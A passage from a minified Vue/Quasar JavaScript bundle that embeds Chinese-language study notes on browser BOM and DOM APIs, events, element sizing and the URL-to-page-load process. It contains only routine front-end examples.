outerWidth/outerHeight\r\n\r\n\t\t\t\t- IE9+/FireFox/Safari中返回浏览器窗口本身尺寸\r\n\t\t\t\t- Opera中表示页面视图容器大小\r\n\r\n\t\t\t- innerWidth/innerHeight\r\n\r\n\t\t\t\t- 页面视图区大小（减去边框宽度）\r\n\r\n\t- 调整浏览器窗口大小\r\n\r\n\t\t- resizeTo()方法\r\n\r\n\t\t\t- 接受浏览器窗口的新高度和宽度两个参数\r\n\r\n\t\t- resizeBy()方法\r\n\r\n\t\t\t- 接受浏览器新窗口的高度和宽度之差两个参数\r\n\r\n\t\t- resizeBy()和resizeTo()都可能被浏览器禁用且不适用于框架，只能对最外层window对象使用\r\n\r\n- 导航和打开窗口\r\n\r\n\t- window.open()方法\r\n\r\n\t\t- 打开新的浏览器窗口或导航到特定url\r\n\t\t- 接受四个参数：要加载的URL、窗口目标、一个特性字符串和一个表示新页面是否取代浏览器历史记录中当前加载页面的布尔值\r\n\t\t- 弹出窗口\r\n\r\n\t\t\t- window.open(\"http://……\", \"topFrame\")\r\n\r\n\t\t\t\t- 有名为topFrame的框架或窗口则在其中加载这个URL\r\n\t\t\t\t- 若无则创建新窗口并命名为topFrame\r\n\t\t\t\t- 第二个参数可以是 _self/_parent/_top/_blank\r\n\r\n\t\t\t- 第二个参数不是已存在框架或窗口\r\n\r\n\t\t\t\t- 根据第三个参数创建新窗口或标签页\r\n\r\n\t\t\t\t\t- 无第三个参数则打开全部默认设置的新窗口\r\n\r\n\t\t\t\t- 不打开新窗口则忽略第三个参数\r\n\r\n\t\t\t- 有的浏览器默认不允许针对主浏览器窗口调整大小或移动位置，但允许对通过window.open()创建的窗口调整\r\n\t\t\t- .opener属性保存打开window对象的原始窗口对象\r\n\r\n\t\t\t\t- var wroxWin=window.open('#', 'wropWindow'); alert(wropWin.opener==window;) //true\r\n\r\n\t\t- 安全限制：许多浏览器限制弹出窗口的实现配置\r\n\t\t- 弹出窗口屏蔽程序\r\n\r\n\t\t\t- 检测是否被屏蔽\r\n\r\n- 间歇调用和超时调用\r\n\r\n\t- 超时调用\r\n\r\n\t\t- 指定的时间过后执行代码\r\n\t\t- 使用window对象的setTimeout()方法\r\n\r\n\t\t\t- 两个参数：要执行的参数，以毫秒表示的时间\r\n\r\n\t\t\t\t- setTimeout(function(){ alert(\"hello\");}, 1000);\r\n\t\t\t\t- 第二个参数表示过多久把当前任务添加到队列中，若队列不为空则等前面代码执行完了执行\r\n\r\n\t\t\t- 返回一个数值ID表示超时调用，可通过此ID取消超时调用\r\n\r\n\t\t\t\t- ClearTimeout(timeoutId);\r\n\r\n\t- 间歇调用\r\n\r\n\t\t- 按照指定时间间隔重复执行代码\r\n\t\t- setInterval()方法\r\n\r\n\t\t\t- 使用方法与setTimeout()方法相同\r\n\r\n\t\t- 开发环境下后一个间歇调用可能会在前一个间歇调用结束之前启动。所以一般使用超时调用，很少使用间歇调用\r\n\r\n- 系统对话框\r\n\r\n\t- 浏览器调用系统对话框方法：alert()/confirm()/prompt()\r\n\r\n\t\t- 打开的对话框是同步和模态的，打开时代码会停止执行\r\n\r\n\t- 与网页无关，不包含HTML，由操作系统和浏览器设置决定外观\r\n\t- alert()方法一般显示警告信息，只有确定按钮\r\n\t- confirm()方法有确认和取消按钮，返回true和false值\r\n\t- prompt()方法生成提示框，可以输入文本\r\n\r\n\t\t- 接受要显示给用户的文本提示和文本输入域默认值两个参数\r\n\t\t- 单击ok返回文本输入域值，单击cancel返回null\r\n\r\n\t- 通过javascript可以打开查找和打印对话框\r\n\r\n\t\t- window.print(); window.find();\r\n\r\n### location对象\r\n\r\n- 提供与当前窗口中加载文档有关信息和一些导航功能\r\n- 即是window对象又是document对象\r\n- 将URL解析为独立片段，开发人员可以通过不同属性访问这些片段\r\n\r\n\t- hash属性\r\n\r\n\t\t- 返回URL中的hash（#后跟0或多个字符）\r\n\r\n\t- host属性\r\n\r\n\t\t- 返回服务器名称和端口号\r\n\r\n\t- hostname属性\r\n\r\n\t\t- 返回不带端口号的服务器名称\r\n\r\n\t- href属性\r\n\r\n\t\t- 返回当前加载页面完整URL\r\n\r\n\t- ……\r\n\r\n- 查询字符串参数\r\n- 位置操作\r\n\r\n\t- 改变浏览器位置并生成新历史记录\r\n\r\n\t\t- assign()方法\r\n\r\n\t\t\t- location.assign('URL');\r\n\t\t\t- 将location.href或window.location设置为一个URL也会调用assign()方法\r\n\r\n\t\t- 修改location对象的其他属性也可以改变当前加载页面\r\n\t\t- 使用replace()方法不会在历史记录中生成新纪录，用户无法回到前一个页面\r\n\t\t- reload()方法重新加载当前页面\r\n\r\n\t\t\t- location.reload(true); 强制从服务器重新加载\r\n\t\t\t- 位于reload()方法之后的代码受网络延迟或系统资源因素影响可能不会执行，一般将其放在代码最后一行\r\n\r\n### navigator对象\r\n\r\n- 提供客户端浏览器信息，是识别客户端浏览器的事实标准\r\n- 检测插件\r\n\r\n\t- 非IE浏览器：使用plugins数组\r\n\r\n\t\t- 数组属性\r\n\r\n\t\t\t- name，插件名字\r\n\t\t\t- description：插件描述\r\n\t\t\t- filename：插件文件名\r\n\t\t\t- length：插件所处理的MIME类型数量\r\n\r\n\t\t- hasPlugin()函数\r\n\r\n\t\t\t- 接受要检测的插件名作为参数\r\n\t\t\t- 可以在FireFox/Opera/Safari/Chrome中使用这种方法\r\n\r\n\t- IE浏览器\r\n\r\n\t\t- 使用专有ActiveXObject类型并尝试创建一个特定插件的实例\r\n\r\n\t\t\t- IE使用COM对象方式实现插件\r\n\r\n\t\t\t\t- COM对象使用唯一标识符来标识\r\n\r\n\t\t\t- hasIEPlugin()函数\r\n\r\n\t\t\t\t- 接收一个COM标识符为参数\r\n\t\t\t\t- 在try-catch语句中进行实例化\r\n\r\n\t- 典型做法：针对每个插件分别创建检测函数\r\n\r\n- 注册处理程序\r\n\r\n\t- FireFox2为navigator对象新增registerContentHandler()和registerProtocolHandler()方法\r\n\r\n\t\t- 可以让一个站点指明它可以处理的特定类型的信息\r\n\r\n\t- registerContentHandler()方法\r\n\r\n\t\t- 三个参数：要处理的MIME类型、可以处理该类型的页面的URL、应用程序名称\r\n\r\n\t- registerProtocolHandler()方法\r\n\r\n\t\t- 三个参数：要处理的协议、处理该协议的页面的URL、应用程序名称\r\n\r\n### screen对象\r\n\r\n- 基本上只用于表明客户端的能力\r\n\r\n\t- 包括浏览器窗口外部显示器信息如像素宽度和高度等\r\n\r\n- 每个浏览器中的screen对象包含不同属性\r\n- 有时用于调整浏览器窗口大小\r\n\r\n### history对象\r\n\r\n- 保存用户上网的历史记录\r\n\r\n\t- 因为history对象是window对象的属性，所以每个浏览器窗口、标签页乃至每个框架都有自己的history对象与特定window对象关联\r\n\t- 出于安全考虑，开发者无法得知用户浏览过的URL\r\n\r\n- go()方法\r\n\r\n\t- 可以在用户历史记录中任意跳转，向前或向后\r\n\t- 接受表示向前或向后跳转的页面数的整数值作为一个参数\r\n\r\n\t\t- history.go(-1); 后退一页\r\n\t\t- history.go(2); 前进两页\r\n\r\n\t- 接受一个字符串作为参数跳转到最近的包含该字符串的位置\r\n\r\n\t\t- history.go('wrox.com'); 可能前进或后退\r\n\r\n\t- back()/forword()方法代替go()，后退或前进一步\r\n\r\n- length属性\r\n\r\n\t- 检测当前页面是不是用户历史记录中第一个页面\r\n\r\n\t\t- if (history.length==0){};\r\n\r\n## BOM\r\n\r\n### 说明：window对象上面的属性和方法\r\n\r\n### 方法\r\n\r\n- 1.onload\r\n\r\n\t- 页面加载完（等在静态资源加载完成），才执行这个函数\r\n\r\n- 2.定时器\r\n\r\n\t- 一次性定时器\r\n\r\n\t\t- 1.setTimeout:（函数，毫秒数）\r\n\r\n\t\t\t- 返回值：返回这个定时器的id\r\n\r\n\t\t- 2 clearTimeout（定时器的id） 停止\r\n\r\n\t- 永久性定时器\r\n\r\n\t\t- 1.setInterval：（函数，毫秒数）\r\n\r\n\t\t\t- 返回值：返回这个定时器的id\r\n\r\n\t\t- 2 clearInterval（定时器的id） 清除永久定时器\r\n\r\n- 3.location\r\n\r\n\t- 负责管理浏览器地址相关的行为和信息的对象\r\n\r\n\t\t- 例：window.location.href = \"http://www.baidu.com\"\r\n\r\n- 4.localStorage\r\n\r\n\t- 实现数据本地化，刷新后还在\r\n\t- 1.setItem(键，值)\r\n\t- 2.getItem（键）------没有值，返回null\r\n\t- 3.removeItem（键）\r\n\t- 4.clear() 清除全部\r\n\r\n- 5.JSON\r\n\r\n\t- 介绍：\r\n\r\n\t\t- 1.本质是有一定格式的字符串\r\n\t\t- 2.BOM上的方法\r\n\r\n\t- 方法：\r\n\r\n\t\t- 1.JSON.stringify(对象);\r\n\r\n\t\t\t- 把对象转为字符串\r\n\r\n\t\t- 2.JSON.parse(json格式字符串);\r\n\r\n\t\t\t- JSON格式的字符串转为对象\r\n\r\n",en={data:function(){return{MainComponent:tn}}},an=en,sn=Object(u["a"])(an,nn,rn,!1,null,"6deeb381",null),on=sn.exports,ln=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},cn=[],pn='# dom\r\n\r\n## DOM事件机制\r\n\r\n### 事件代理（委托）\r\n\r\n- 由于事件会在冒泡阶段向上传播到父节点，因此可以把子节点的监听函数定义在父节点上，由父节点的监听函数统一处理多个子元素的事件。\r\n\r\n  - 减少内存消耗，提高性能\r\n  - 动态绑定事件\r\n\r\n### Event对象常见应用\r\n\r\n- event.preventDefault\r\n\r\n  - 默认事件行为将不会触发\r\n\r\n- event.stopPropagation\r\n\r\n  - 阻止事件冒泡到父元素，阻止任何父事件处理程序被执行。\r\n\r\n- stopImmediatePropagation\r\n\r\n  - 既能阻止事件向父元素冒泡，也能阻止元素同事件类型的其它监听器被触发。\r\n\r\n- event.target & event.currentTarget\r\n\r\n  - event.target\r\n\r\n    - 指向引起触发事件的元素\r\n\r\n      - 一个目标元素\r\n\r\n  - event.currentTarget\r\n\r\n    - 返回绑定事件的元素\r\n\r\n      - 目标元素+冒泡经过元素\r\n\r\n  - 包含所有与事件有关的信息\r\n  - this始终等于currentTarget的值\r\n\r\n### DOM事件模型和事件流\r\n\r\n- 事件模型\r\n\r\n  - 捕获\r\n  - 冒泡\r\n\r\n- 事件传播\r\n\r\n  - 捕获阶段\r\n  - 目标阶段\r\n  - 冒泡阶段\r\n\r\n### DOM事件级别\r\n\r\n- DOM0级事件\r\n\r\n  - 不允许给一个元素绑定多个事件\r\n  - 事件方法在事件行为的冒泡阶段执行\r\n\r\n- DOM2级事件\r\n\r\n  - IE9以上\r\n\r\n    - addEventListener\r\n\r\n      - event-name\r\n\r\n        - 事件名称\r\n\r\n      - callback\r\n\r\n        - 回调函数，参数为当前事件对象event\r\n\r\n      - useCapture\r\n\r\n        - 默认是false，代表事件句柄在冒泡阶段执行\r\n\r\n    - removeEventListener\r\n\r\n      - 绑定的函数最好是声明函数变量，这样才能将同一个函数传入\r\n\r\n    - 事件程序作用域是依附元素作用域\r\n\r\n  - IE9以下\r\n\r\n    - attachEvent\r\n    - detachEvent\r\n\r\n      - 绑定的函数最好是声明函数变量，这样才能将同一个函数传入\r\n\r\n    - 第一个事件名称前要加on。\r\n    - 因为IE9以下是不支持事件捕获的，所以也没有第三个参数。\r\n    - 事件处理程序的作用域是全局作用域\r\n\r\n- DOM3级事件\r\n\r\n  - UI事件\r\n\r\n    - load\r\n    - sroll\r\n\r\n  - 焦点事件\r\n\r\n    - blur\r\n    - focus\r\n\r\n  - 鼠标事件\r\n\r\n    - dblclick\r\n    - mouseup\r\n\r\n  - 滚轮事件\r\n\r\n    - mousewheel\r\n\r\n  - 文本事件\r\n\r\n    - textInput\r\n\r\n  - 键盘事件\r\n\r\n    - keydown\r\n    - keypress\r\n\r\n  - 合成事件\r\n\r\n    - compositionstart\r\n\r\n  - 变动事件\r\n\r\n    - DOMsubtreeModified\r\n\r\n  - 自定义事件\r\n\r\n## DOM\r\n\r\n### 1.获取DOM\r\n\r\n- 1.节点(元素对象，DOM节点)\r\n\r\n  - 1.返回DOM节点\r\n\r\n    - 1.getElementById("id名")\r\n    - 2.querySelector("CSS名")\r\n\r\n  - 2.返回伪数组\r\n\r\n    - 1.getElementByTagName("标签名")\r\n    - 2.getElementByClassName（"类名"）\r\n    - 3.querySelectorAll("CSS名")\r\n\r\n- 2.DOM样式\r\n\r\n  - 1.dom.style.color\r\n\r\n    - 1.DOM只能操作行内样式\r\n\r\n  - 2.window.getComputedStyle(box)  括号中填写元素对象，DOM节点，\r\n\r\n    - 1.返回的属性值为字符串\r\n    - 2.返回所有（无论是行内还是非行内）的样式集合/对象\r\n\r\n### 2.注册事件\r\n\r\n- 1.点击事件（元素对象，DOM节点）\r\n\r\n  - click\r\n\r\n- 2.焦点事件\r\n\r\n  - focus\r\n\r\n    - 获取焦点\r\n\r\n      - 注册给有光标的标签\r\n\r\n  - blur\r\n\r\n    - 失去焦点\r\n\r\n      - 注册给有光标的标签\r\n\r\n- 3.鼠标事件\r\n\r\n  - mousedown\r\n\r\n    - 鼠标点下\r\n\r\n  - mousemove\r\n\r\n    - 鼠标移动\r\n\r\n  - mouseup\r\n\r\n    - 鼠标松开\r\n\r\n  - mouseover《==》mouseenter\r\n\r\n    - 鼠标移入，后者不支持冒泡\r\n\r\n  - mouseout《==》mouseleave\r\n\r\n    - 鼠标移除，后者不支持冒泡\r\n\r\n- 4.键盘事件\r\n\r\n  - keydown\r\n\r\n    - 按键按下\r\n\r\n  - keyup\r\n\r\n    - 按键抬起\r\n\r\n- 5.滚动事件\r\n\r\n  - scroll 当元素滚动的时候执行\r\n\r\n- 6.动画结束后触发事件（只能用addEventListener）\r\n\r\n  - 1.transitionend\r\n\r\n    - 元素过度结束时执行\r\n\r\n  - 2.animationed\r\n\r\n    - 元素帧动画结束时执行\r\n\r\n- 7.触摸事件（移动端）\r\n\r\n  - 1.touch（刚刚触摸）\r\n  - 2.touchmove（手指滑动）\r\n  - 3.touchend（手指离开）\r\n\r\n- 8.存在多次注册事件，容易被后者覆盖，解决方法：\r\n\r\n  - 例：btn.addEventListener("click",function()\r\n   console.log(1);\r\n)\r\n\r\n### 3.属性\r\n\r\n- 1.自定义属性\r\n\r\n  - 说明：把数据存储到对应元素的身上使用的属性，没有特别功能，仅是需要，返回值是 对象\r\n  - 1.用法\r\n\r\n    - 1.定义： data-  开头的\r\n    - 2.取值：例如：console.log(dom_div.dataset.name)\r\n\r\n- 2.相关方法（推荐用于自定义属性操作）\r\n\r\n  - 1.getAttribute("属性名称") -----获取\r\n  - 2.setAttribute("属性名","属性值")-----设置\r\n  - 3.removeAttribute("属性名称")------删除\r\n\r\n- 3.标准属性\r\n\r\n  - 说明：html中出现的，具有特别功能的属性\r\n  - 1.ckecked\r\n\r\n    - 说明：开关属性，只有两种状态的属性\r\n\r\n  - 2.class\r\n\r\n    - 1.className\r\n    - 2.classList(类名)\r\n\r\n      - 1.add（新增）\r\n      - 2.remove(移除)\r\n      - 3.toggle（切换类名）\r\n\r\n  - 3.style\r\n\r\n    - 例如：img-src，a-href，id，class等\r\n\r\n  - 4.value\r\n  - 5.src\r\n  - 6.disabled\r\n\r\n    - 按钮是否被禁用\r\n\r\n- 4.获取\r\n\r\n  - 1.父元素.children\r\n\r\n    - 获取子元素：可以得到某个元素之下的所有的子元素的集合，一个伪数组\r\n\r\n  - 2.父元素 childNodes\r\n\r\n    - 获取子元素：可以得到所有的子元素，\r\n    - 需要注意的是，<ul>\r\n       <li></li>\r\n    <ul>\r\n会得到 text,li，text\r\n\r\n  - 3.元素.parentNode\r\n\r\n    - 获取父元素：返回一个\r\n\r\n  - 4.元素.firstElementChild\r\n\r\n    - 获取第一个子元素\r\n\r\n  - 5.元素.lastElementChild\r\n\r\n    - 获取最后一个子元素\r\n\r\n  - 6.获取兄弟元素\r\n\r\n    - 1.元素.nextElementSibling  -  得到下一个兄弟元素\r\n    - 2.元素.previousElementSibling - 得到上一个兄弟元素\r\n\r\n### 4.创建\r\n\r\n- 1.innerHTML\r\n\r\n  - 1.设置html结构    2.会覆盖\r\n\r\n- 2.document.write()\r\n\r\n  - 会覆盖\r\n\r\n- 3.document.createElement()\r\n\r\n  - 创建标签节点\r\n\r\n- 4.document.createAttribute(元素属性)\r\n\r\n  - 创建属性节点\r\n\r\n- 5.document.createTextNode(文本内容)\r\n\r\n  - 创建文本节点\r\n\r\n- 6.insertAdjacentHTML(\'位置\',Html结构)\r\n\r\n### 5.修改\r\n\r\n- 1.innerHTML   结构\r\n- 2.innerText  文本内容\r\n\r\n### 6.添加\r\n\r\n- 父节点 .appendChild(新DOM节点)：从后添加新的DOM节点\r\n- 父节点 .insertBefore(新的DOM节点，插入之前的DOM节点)，在某个子元素之前，添加新的DOM节点\r\n\r\n### 7.其他操作\r\n\r\n- 1.替换元素\r\n\r\n  - 父节点.replaceChild(新的节点,旧的子节点)\r\n\r\n- 2.克隆元素\r\n\r\n  - 元素.cloneNode(true或false);  返回一份新的克隆后的元素\r\n\r\n### 8.innerText和textContent比较\r\n\r\n- 相同点：\r\n\r\n  - 获取的都是Text文本\r\n\r\n- 不同点：\r\n\r\n  - 1.innerText基本没有兼容问题/textContent属性在ie低版本中不支持\r\n  - 2.innerText（野路子，但是兼容性好,推荐使用）/textContent标准属性（官宣）\r\n\r\n## 事件\r\n\r\n### 1.事件三要素\r\n\r\n- 1.事件源\r\n\r\n  - 被触发的元素\r\n\r\n- 2.事件类型\r\n\r\n  - 如何触发的事件\r\n\r\n- 3.事件处理程序\r\n\r\n  - 事件发生后的结果\r\n\r\n### 2.事件的三个阶段（事件流）\r\n\r\n- 1.捕获\r\n\r\n  - 从根部往目标DOM节点上，一层一层的找，捕获是用户点击了那个DOM节点。\r\n\r\n- 2.到达目标\r\n- 3.冒泡\r\n\r\n  - 从目标节点到根节点\r\n\r\n- 冒泡执行\r\n\r\n  - 事件默认是在冒泡阶段执行；当我们目标DOM节点注册了事件，冒泡往上的DOM节点也注册了同样的事件话，也会执行\r\n\r\n### 3.事件对象\r\n\r\n- 说明：一个集合体，用来描述点击的行为(点击位置，点击了谁，注册给谁)\r\n- 1.clientX/Y 相对于当前窗口\r\n- 2.pageX/Y 相对于body左上角\r\n- 3.target 点击了那个DOM节点，返回哪个DOM节点\r\n- 4.currenTarget 返回事件源（事件源：事件给谁注册了，这就是那个源头）\r\n- 5.offset系列\r\n\r\n  - 1.offsetLeft\r\n\r\n    - box距左的距离\r\n\r\n      - 找参考的父亲，父辈元素没有定位，继续往上找，直至body\r\n\r\n  - 2.offsetTop\r\n\r\n    - box距上的距离\r\n\r\n      - 找参考的父亲，父辈元素没有定位，继续往上找，直至body\r\n\r\n  - 3.offsetWidth\r\n\r\n    - 获取DOM节点的宽度\r\n\r\n  - 4.offsetHeight\r\n\r\n    - 获取DOM节点的高度\r\n\r\n- 6.可视区域（padding+content）\r\n\r\n  - 1.元素.clientHeight\r\n  - 2.元素.clientWidth\r\n\r\n- 5.触摸点\r\n\r\n  - 1.对象.touches(屏上面的触摸点)\r\n  - 2.对象.targetTouches(元素上面的触摸点)\r\n  - 3.对象.changedTouches（变化的触摸点）\r\n\r\n- 6.阻止冒泡（为了更好的用户体验）\r\n\r\n  - 1.例：btn.addEventListener(\'click\',function(e)){\r\n  e.stopPropagation();\r\n}\r\n  - 2.canceBubble（） --------只支持IE\r\n\r\n- 7.阻止默认行为：（e.prventDefault()）\r\n\r\n  - 1.禁止鼠标右键  \r\n例: document.oncontextmenu = function(e){\r\n      e.prventDefault()\r\n}\r\n  - 2.a标签跳转等\r\n\r\n    - 1.（也可以使用 return false）\r\n    - 2. javascript:void(0)\r\n\r\n### 4.事件解绑\r\n\r\n- 1. 例：begin.onclick = null；\r\n- 2.例：begin.removeEventListener("click",fn)\r\n\r\n### 5.事件委托\r\n\r\n- 1.把事件注册在父级的元素上\r\n- 2.利用事件冒泡执行，当事件传播到已经注册了事件的父级元素身上\r\n- 3.判断触发事件DOM(e.target)节点是否是指定的元素 例:e.target.nodeName ==\'li\'\r\n\r\n  - 若是 则继续\r\n  - 若不是 则什么都不做\r\n\r\n## 【DOM相关】JavaScript获取元素的位置与尺寸\r\n\r\n### （1）获取元素的尺寸\r\n\r\n- 0. 【elem.style.width（可写）】CSS写入的宽高\r\n\r\n  - jQuery-【$().width()】\r\n\r\n- 1.【clientHeight】内宽高—— 内边距 + 内容框（如果有滚动条，还需要减去滚动条的宽度）\r\n\r\n  - jQuery-【$().innerwidth()】\r\n\r\n- 2.【offsetHeight】 外宽高—— 边框 + 内边距 + 内容框\r\n\r\n  - jQuery-【$().outerwidth()】\r\n\r\n- 3.【scrollHeight】 用来计算可滚动容器的大小，包括不可见的部分，当然，scrollHeight 的值需要加上 padding 的值。\r\n\r\n  - 例子\r\n\r\n    - 图\r\n\r\n    - 解释\r\n\r\n      - 此时滚动条的宽度是 17px，根据前面的介绍，滚动条时占用 padding 和 content 宽度的，而 17px 大于 padding 的 10px，故还有 7px 会占据 content。\r\n      - 分析一下，offsetHeight 的值是 124，padding 10px，滚动条虽然存在，但是占了 padding 和内容的空间，offsetHeight 的值是 4+20+76 = 124px。scrollHeight 的值是可滚动的范围加上padding 值，同样不包括滚动条，即 150+20 = 170px。clientHeight 的值是可见区域，但是不包括滚动条的值（滚动条。。。），所以20+100-17 = 79px。\r\n      - 其实也不是非常复杂。这个时候可以得出滚动条宽度的计算：offsetHeight 减去 border 和 clientHeight 的和就是滚动条宽度。\r\n\r\n- 4.【getComputedStyle】获取元素内容的尺寸（最终计算后的结果）\r\n\r\n  - 使用\r\n\r\n    - window.getComputedStyle(ele， boolean)\r\n    - document.defaultView.getComputedStyle(ele， boolean)\r\n    - window.getComputedStyle(elem, null).getPropertyValue("height")\r\n    - 接受两个参数：要取得计算样式的元素和一个伪元素字符串（例如“:after”）。如果不需要伪元素信息，第二个参数可以是null。getComputerStyle()方法返回一个CSSStyleDeclaration对象，其中包含当前元素的所有计算的样式。\r\n\r\n  - 图\r\n\r\n  - 注意\r\n\r\n    - 在有滚动条的情况下，该属性返回的宽高为，CSS宽高减去滚动条的宽高\r\n\r\n  - 延伸\r\n\r\n    - getComputedStyle会引起回流，因为它需要获取祖先节点的一些信息进行计算（譬如宽高等），所以用的时候慎用，回流会引起性能问题。然后合适的话会将话题引导回流，重绘，浏览器渲染原理等等。当然也可以列举一些其它会引发回流的操作，如offsetXXX，scrollXXX，clientXXX，currentStyle等等\r\n\r\n  - 与elem.style的区别\r\n\r\n- 5.【elem.getBoundingClientRect()】获取元素宽高 等同于 offsetHeight——边框 + 内边距 + 内容框\r\n\r\n### （2）获取元素的位置\r\n\r\n- 1.【elem.getBoundingClientRect()】只读、相对于视口（浏览器窗口）\r\n\r\n  - 方法返回元素的大小及其相对于视口的位置。返回值是一个 DOMRect 对象\r\n  - DOMRect 对象包含了一组用于描述边框的只读属性——left、top、right和bottom，单位为像素。除了 width 和 height 外的属性都是相对于视口的左上角位置而言的\r\n  - 图\r\n\r\n  - 绝对位置-相对于当前document元素的位置-jQuery 【$().offset().top】\r\n\r\n    - 再加上滚动距离，就可以得到绝对位置（不管页面怎么滚动永远为元素离文档的距离）\r\n    - 注意\r\n\r\n      - 页面指定了DTD，即指定了DOCTYPE时，使用document.documentElement。\r\n      - 页面没有DTD，即没指定DOCTYPE时，使用document.body。\r\n\r\n  - 此处的left与top指的是position的left和top加上元素的margin，即指的是元素的边框距离浏览器窗口的值，如没有定位，那么即为元素margin的值\r\n\r\n- 2.【elem.offsetTop（可写）】子元素距离父元素的距离，即子元素的边框到父元素的边框的距离（子元素的margin + 父元素的padding）\r\n\r\n### （3）获取客户端以及屏幕高度\r\n\r\n- （1）screen.width\r\n\r\n  - 显示器的水平方向的像素时，不随着我们浏览器窗口的变化而变化，是用设备像素衡量的\r\n\r\n- （2）window.innerWidth\r\n\r\n  - window.innerWidth指的是浏览器窗口的宽度，是可以变化的，所以使用的是CSS像素\r\n  - 100%缩放下\r\n\r\n    - 可以发现在100%缩放情况下，window.innerWidth的值为1192，window.innerHeight的值为455\r\n\r\n  - 200%缩放下\r\n\r\n    - 因为window.innerWidth是用CSS像素衡量的，放大两倍之后，浏览器窗口只能看到之前一半的内容，所以window.innerWidth是之前的一半\r\n\r\n- （3）document.documentElement.clientWidth\r\n\r\n  - 指的是网页可见区域高的宽度，与window.innerWidth的区别就只差了一个滚动条（不包含滚动条）\r\n\r\n- （4）document.documentElement.offsetWidth\r\n\r\n  - 取得html标签的宽度\r\n  - 与clientwidth的区别\r\n\r\n    - 看到没document.documentElement.offsetHeight此时为0，我打开调试定位了下，发现此时html高度确实是为0，而document.documentElement.clientHeight此时为455，是viewport的高度，只不过此时viewport的高度和window.innerHeight相等\r\n\r\n- （5）document.documentElement.scrollHeight\r\n\r\n  - 网页正文全文高\r\n\r\n- （6）document.documentElement.scrollTop\r\n\r\n  - 网页被卷去的高\r\n\r\n### （4）移动端的三个viewport理论\r\n\r\n- layout viewport\r\n\r\n  - 介绍\r\n\r\n    - 布局layout，和PC端的viewport很像，PC端的viewport的宽由浏览器窗口的宽决定的，用户可以通过拖动窗口或者缩放改变viewport的大小，但是在移动端则不同，在IOS中layout viewport默认大小980px，在android中layout viewport为800px，很明显这两个值都大于我们浏览器的可视区域宽度。我们可以通过document.documentElement.clientWidth来获取layout viewport的宽度\r\n\r\n  - 直观\r\n\r\n- visual viewport\r\n\r\n  - 介绍\r\n\r\n    - 有了layout viewport，我们还需要一个viewport来表示我们浏览器可视区域的大小，这个就是visual viewport。visual viewport的宽度可以通过window.innerWidth获取\r\n    - 移动端浏览器为了不让用户通过缩放和滑动就能看到整个网页的内容，默认情况下会将visual viewport进行缩放到layout viewport一样大小，这也就解释了为什么PC端设计的网页在手机上浏览会缩小，其实这是跟移动浏览器默认的行为有关系\r\n\r\n  - 直观\r\n\r\n- ideal viewport\r\n\r\n  - 设备理想viewport，有以下几个要求：\r\n\r\n    - 用户不需要缩放和滚动条就能查看所有内容\r\n    - 文字大小合适，不会因为在高分辨率手机下就显示过小而看不清，图片也一样\r\n\r\n  - 这个viewport就叫做ideal viewport。但是不同的设备的ideal viewport不一样，有320px，有360px的，还有384px的......\r\n  - 如何获得\r\n\r\n    - （1）layout viewport能被设置成ideal viewport。width=device-width和initial-scale=1指令可以做到。\r\n    - （2）所有的scale指令都是相对于ideal viewport的。无视layout viewport设置了多少，所以maximum-scale=3意味着最大的缩放值是ideal viewport的300%\r\n\r\n\r\n',un={data:function(){return{MainComponent:pn}}},mn=un,dn=Object(u["a"])(mn,ln,cn,!1,null,"97a5d63a",null),gn=dn.exports,bn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},vn=[],hn="## 浏览器从输入URL到页面加载的过程\r\n\r\n### 多进程的浏览器\r\n\r\n- 浏览器是多进程的，有一个主控进程，以及每一个tab页面都会新开一个进程（某些情况下多个tab会合并进程）\r\n\r\n进程可能包括主控进程，插件进程，GPU，tab页（浏览器内核）等等\r\n\r\n```\r\n- Browser进程：浏览器的主进程（负责协调、主控），只有一个\r\n- 第三方插件进程：每种类型的插件对应一个进程，仅当使用该插件时才创建\r\n- GPU进程：最多一个，用于3D绘制\r\n- 浏览器渲染进程（内核）：默认每个Tab页面一个进程，互不影响，控制页面渲染，脚本执行，事件处理等（有时候会优化，如多个空白tab会合并成一个进程）\r\n```\r\n\r\n- 多线程的浏览器内核\r\n  - 每一个tab页面可以看作是浏览器内核进程，然后这个进程是多线程的，它有几大类子线程\r\n    - GUI线程\r\n    - JS引擎线程\r\n    - 事件触发线程\r\n    - 定时器线程\r\n    - 网络请求线程\r\n\r\n### 解析URL\r\n\r\n- 输入URL后，会进行解析（URL的本质就是统一资源定位符）\r\n  - URL一般包括几大部分：\r\n    - protocol，协议头，譬如有http，ftp等\r\n    - host，主机域名或IP地址\r\n    - port，端口号\r\n    - path，目录路径\r\n    - query，即查询参数\r\n    - fragment，即#后的hash值，一般用来定位到某个位置\r\n  - 网络请求都是单独的线程\r\n    - 每次网络请求时都需要开辟单独的线程进行，譬如如果URL解析到http协议，就会新建一个网络线程去处理资源下载\r\n\r\n因此浏览器会根据解析出得协议，开辟一个网络线程，前往请求资源（这里，暂时理解为是浏览器内核开辟的，如有错误，后续修复）\r\n\r\n### 开启网络线程到发出一个完整的http请求\r\n\r\n- DNS查询得到IP\r\n  - 如果输入的是域名，需要进行dns解析成IP，大致流程：\r\n    - 如果浏览器有缓存，直接使用浏览器缓存，否则使用本机缓存，再没有的话就是用host\r\n    - 如果本地没有，就向dns域名服务器查询（当然，中间可能还会经过路由，也有缓存等），查询到对应的IP\r\n- tcp/ip请求\r\n  - http的本质就是tcp/ip请求\r\n    - tcp将http长报文划分为短报文，通过三次握手与服务端建立连接，进行可靠传输\r\n      - 三次握手的步骤：（抽象派）\r\n        - 客户端：hello，你是server么？\r\n          服务端：hello，我是server，你是client么\r\n          客户端：yes，我是client\r\n        - 建立连接成功后，接下来就正式传输数据\r\n    - 待到断开连接时，需要进行四次挥手（因为是全双工的，所以需要四次挥手）\r\n      - 四次挥手的步骤：（抽象派）\r\n        - 主动方：我已经关闭了向你那边的主动通道了，只能被动接收了\r\n          被动方：收到通道关闭的信息\r\n          被动方：那我也告诉你，我这边向你的主动通道也关闭了\r\n          主动方：最后收到数据，之后双方无法通信\r\n  - tcp/ip的并发限制\r\n    - 浏览器对同一域名下并发的tcp连接是有限制的（2-10个不等）\r\n\r\n而且在http1.0中往往一个资源下载就需要对应一个tcp/ip请求\r\n\r\n所以针对这个瓶颈，又出现了很多的资源优化方案\r\n\r\n```\r\n- get和post的区别\r\n\r\n\t- 